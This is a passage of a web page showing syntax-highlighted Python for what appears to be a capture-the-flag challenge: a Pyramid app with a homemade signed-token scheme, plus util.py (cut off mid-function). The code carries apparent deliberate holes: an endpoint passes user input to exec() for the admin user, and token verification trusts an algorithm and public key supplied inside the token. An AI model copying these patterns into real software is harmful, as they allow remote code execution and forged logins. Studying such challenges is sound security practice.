</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">wsgiref.simple_server</span> <span class="kn">import</span> <span class="n">make_server</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.config</span> <span class="kn">import</span> <span class="n">Configurator</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.events</span> <span class="kn">import</span> <span class="n">NewResponse</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyramid.response</span> <span class="kn">import</span> <span class="n">Response</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">util</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">users</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="n">super_user</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;admin&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">default_alg</span> <span class="o">=</span> <span class="s2">&#34;RS&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register_api</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">super_user</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;Not Allowed!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;Please Input username &amp; password&#39;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="s2">&#34;500 Internal Server&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">users</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">util</span><span class="o">.</span><span class="n">data_encode</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">default_alg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;Here is your token: &#34;</span><span class="o">+</span> <span class="n">token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register_front</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">util</span><span class="o">.</span><span class="n">read_html</span><span class="p">(</span><span class="s1">&#39;register.html&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">front_test</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">util</span><span class="o">.</span><span class="n">read_html</span><span class="p">(</span><span class="s1">&#39;test.html&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">system_test</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">code</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">util</span><span class="o">.</span><span class="n">data_decode</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">username</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">super_user</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Welcome super_user!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;Unauthorized&#39;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="s2">&#34;401 Unauthorized&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;Unauthorized&#39;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="s2">&#34;401 Unauthorized&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;Please Input code &amp; token&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">exec</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;Success!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">Configurator</span><span class="p">()</span> <span class="k">as</span> <span class="n">config</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;register_front&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;register_api&#39;</span><span class="p">,</span> <span class="s1">&#39;/api/register&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;system_test&#39;</span><span class="p">,</span> <span class="s1">&#39;/api/test&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;front_test&#39;</span><span class="p">,</span> <span class="s1">&#39;/test&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">system_test</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;system_test&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">front_test</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;front_test&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">register_api</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;register_api&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">register_front</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;register_front&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">app</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">make_wsgi_app</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">server</span> <span class="o">=</span> <span class="n">make_server</span><span class="p">(</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">6543</span><span class="p">,</span> <span class="n">app</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>util.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Signature</span> <span class="kn">import</span> <span class="n">pkcs1_15</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">SHA256</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">secret</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_keys</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">private_key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">public_key</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">publickey</span><span class="p">()</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">private_key</span><span class="p">,</span> <span class="n">public_key</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sign_data</span><span class="p">(</span><span class="n">private_key</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">rsakey</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Â∞ÜJSONÊï∞ÊçÆËΩ¨Êç¢‰∏∫Â≠óÁ¨¶‰∏≤</span>
</span></span><span class="line"><span class="cl">    <span class="n">data_str</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">hash_obj</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">data_str</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">signature</span> <span class="o">=</span> <span class="n">pkcs1_15</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">rsakey</span><span class="p">)</span><span class="o">.</span><span class="n">sign</span><span class="p">(</span><span class="n">hash_obj</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">signature</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">verify_signature</span><span class="p">(</span><span class="n">secret</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">signature</span><span class="p">,</span> <span class="n">alg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">alg</span> <span class="o">==</span> <span class="s1">&#39;RS&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">rsakey</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Â∞ÜJSONÊï∞ÊçÆËΩ¨Êç¢‰∏∫Â≠óÁ¨¶‰∏≤</span>
</span></span><span class="line"><span class="cl">        <span class="n">data_str</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">hash_obj</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">data_str</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pkcs1_15</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">rsakey</span><span class="p">)</span><span class="o">.</span><span class="n">verify</span><span class="p">(</span><span class="n">hash_obj</span><span class="p">,</span> <span class="n">signature</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Signature is valid. Transmitted data:&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="p">(</span><span class="ne">ValueError</span><span class="p">,</span> <span class="ne">TypeError</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Signature is invalid.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">alg</span> <span class="o">==</span> <span class="s1">&#39;HS&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">hash_object</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">data_bytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="n">secret</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">data_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">hash_object</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">data_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">hex_dig</span> <span class="o">=</span> <span class="n">hash_object</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">hex_dig</span> <span class="o">==</span> <span class="n">signature</span><span class="o">.</span><span class="n">decode</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">data_encode</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">alg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">alg</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;HS&#39;</span><span class="p">,</span> <span class="s1">&#39;RS&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="s2">&#34;Algorithm must be HS or RS!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">private_key</span><span class="p">,</span> <span class="n">public_key</span> <span class="o">=</span> <span class="n">generate_keys</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">alg</span> <span class="o">==</span> <span class="s1">&#39;RS&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">signature</span> <span class="o">=</span> <span class="n">sign_data</span><span class="p">(</span><span class="n">private_key</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">data_bytes</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data1</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">data_bytes</span><span class="p">)</span>  <span class="c1"># data</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data2</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">signature</span><span class="p">)</span>  <span class="c1"># signature</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">encoded_data2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data3</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">alg</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>  <span class="c1"># alg</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data4</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>  <span class="c1"># public_key</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data</span> <span class="o">=</span> <span class="n">encoded_data1</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">encoded_data2</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">encoded_data3</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">encoded_data4</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;The encoded data is: &#34;</span><span class="p">,</span> <span class="n">encoded_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">encoded_data</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">hash_object</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">data_bytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="n">secret</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">inputdata</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">hash_object</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">data_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">hex_dig</span> <span class="o">=</span> <span class="n">hash_object</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">signature</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">hex_dig</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data1</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">inputdata</span><span class="p">)</span>  <span class="c1"># data</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data3</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">alg</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>  <span class="c1"># alg</span>
</span></span><span class="line"><span class="cl">            <span class="n">encoded_data</span> <span class="o">=</span> <span class="n">encoded_data1</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">signature</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">encoded_data3</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;The encoded data is: &#34;</span><span class="p">,</span> <span class="n">encoded_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">encoded_data</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">data_decode</span><span class="p">(</span><span class="n">encode_data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">all_data</span> <span class="o">=</span> <span class="n">encode_data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">sig_bytes</span> <span class="o">=</span> <span class="n">all_data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">sig_bytes</span><span class="p">)</span>
